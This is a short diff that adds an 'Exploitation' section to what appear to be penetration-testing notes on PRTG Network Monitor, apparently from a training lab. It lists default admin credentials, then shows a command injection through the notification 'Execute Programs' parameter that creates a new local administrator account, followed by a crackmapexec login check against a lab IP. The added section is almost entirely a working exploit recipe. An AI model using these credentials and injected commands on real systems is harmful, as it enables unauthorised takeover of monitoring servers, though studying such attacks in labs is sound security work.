@@ -28,3 +28,14 @@ prtgadmin:prtgadmin
 prtgadmin:Password123
 prtgadmin:prtg
 ```
+
+# Exploitation
+```powershell
+Setup --> Account Settings --> Notifications --> Add new notifications --> Execute Programs
+
+Parameter: test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+
+Test Notification
+
+sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
+```
